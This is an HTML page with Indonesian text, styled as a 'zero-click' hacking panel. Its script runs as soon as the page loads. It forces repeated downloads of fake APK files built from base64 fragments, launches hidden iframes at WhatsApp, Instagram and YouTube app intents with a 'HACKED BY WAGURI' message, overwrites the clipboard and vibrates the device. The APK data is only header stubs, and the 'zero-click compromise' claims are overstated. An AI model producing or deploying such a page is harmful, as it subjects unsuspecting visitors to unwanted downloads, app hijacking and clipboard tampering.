<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>SYSTEM KERNEL ZERO-CLICK</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #000; color: #ff0000; font-family: monospace;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; text-align: center; overflow: hidden;
  }
  .panel { background: #0a0a0a; padding: 35px; border-radius: 15px; border: 2px solid #ff0000; max-width: 420px; width: 100%; box-shadow: 0 0 40px rgba(255,0,0,0.7); }
  h2 { animation: extreme-glitch 0.1s infinite; font-size: 24px; }
  @keyframes extreme-glitch { 
    0% { transform: translate(0); color: #ff0000; }
    20% { transform: translate(-4px, 3px); color: #ffffff; }
    40% { transform: translate(-15px, -3px); color: #ff0000; }
    60% { transform: translate(4px, 4px); color: #00ff00; }
    80% { transform: translate(-2px, -2px); color: #ff0000; }
    100% { transform: translate(0); }
  }
  #log { margin-top: 20px; background: #000; padding: 12px; border-radius: 6px; color: #00ff00; font-size: 11px; text-align: left; height: 140px; overflow-y: auto; border: 1px solid #ff0000; }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>⚡ ZERO-CLICK ACTIVE ⚡</h2>
  <p style="color: #fff; margin-top: 10px; font-size: 13px;">Memicu payload otomatis tanpa interaksi...</p>
  <div id="log">[!] Menginisialisasi siklus zero-click...</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    logEl.scrollTop = logEl.scrollHeight;
    console.log(msg);
  }

  var PAYLOAD_TEXT = "HACKED BY WAGURI - ZERO-CLICK COMPROMISE";
  var ENCODED_TEXT = encodeURIComponent(PAYLOAD_TEXT);
  
  var TARGETS = [
    "whatsapp://send?text=" + ENCODED_TEXT,
    "intent://send?text=" + ENCODED_TEXT + "#Intent;package=com.whatsapp;scheme=whatsapp;end;",
    "instagram://",
    "intent://#Intent;package=com.instagram.android;scheme=instagram;end;",
    "vnd.youtube://",
    "intent://#Intent;package=com.google.android.youtube;scheme=vnd.youtube;end;"
  ];

  var F1 = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
  var F2 = "UEsDBAoAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAAUGF5bG9hZFBhcnQ=";
  var F3 = "UEsDBBQACAAIAAAAIQAAAAAAAAAAAAAAAAAKAAAAcmVzb3VyY2Vz";

  function triggerVibration() {
    try {
      if (navigator.vibrate) {
        navigator.vibrate([200, 100, 200, 100]);
      }
    } catch(e) {}
  }

  function dropMassiveAPKs(batchIndex) {
    try {
      var b1 = atob(F1), b2 = atob(F2), b3 = atob(F3);
      var combined = b1 + b2 + b3;
      var buffer = new Uint8Array(combined.length);
      for (let i = 0; i < combined.length; i++) buffer[i] = combined.charCodeAt(i);

      var blob = new Blob([buffer], { type: "application/vnd.android.package-archive" });
      var url = URL.createObjectURL(blob);

      var a = document.createElement("a");
      a.href = url;
      a.download = "ZeroClick_Payload_" + batchIndex + ".apk";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      log("[+] Zero-Click APK Thread #" + batchIndex + " Dispatched.");
    } catch(e) {
      log("[-] APK Drop Fail: " + e.message);
    }
  }

  function sprayIntents() {
    try {
      var container = document.getElementById("launcher-container");
      for (let i = 0; i < TARGETS.length; i++) {
        var scheme = TARGETS[i];
        var iframe = document.createElement("iframe");
        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
        iframe.style.display = "none";
        iframe.src = scheme;
        container.appendChild(iframe);
      }
      log("[+] Zero-Click Intent Spraying Completed.");
    } catch(e) {
      log("[-] Intent Spray Error: " + e.message);
    }
  }

  function executeClipboardSpam() {
    try {
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(PAYLOAD_TEXT);
        log("[+] Clipboard Overwritten Automatically.");
      } else {
        var ta = document.createElement("textarea");
        ta.value = PAYLOAD_TEXT;
        ta.style.position = "fixed";
        document.body.appendChild(ta);
        ta.focus();
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        log("[+] Clipboard Overwritten via Fallback.");
      }
    } catch(e) {}
  }

  // ============================================
  // AUTO-EXECUTE (ZERO-CLICK ON LOAD)
  // ============================================
  window.addEventListener('DOMContentLoaded', function() {
    triggerVibration();
    log("[!] Memulai eksekusi zero-click instan...");

    var totalRounds = 5;
    var burstTasks = [];

    for (let r = 0; r < totalRounds; r++) {
      burstTasks.push(new Promise((resolve) => {
        var jitter = Math.floor(Math.random() * 10);
        setTimeout(() => {
          dropMassiveAPKs(r);
          sprayIntents();
          executeClipboardSpam();
          resolve();
        }, jitter + (r * 15));
      }));
    }

    Promise.allSettled(burstTasks).then(() => {
      log("[✓] Siklus zero-click selesai dieksekusi.");
    });
  });

})();
</script>
</body>
</html>
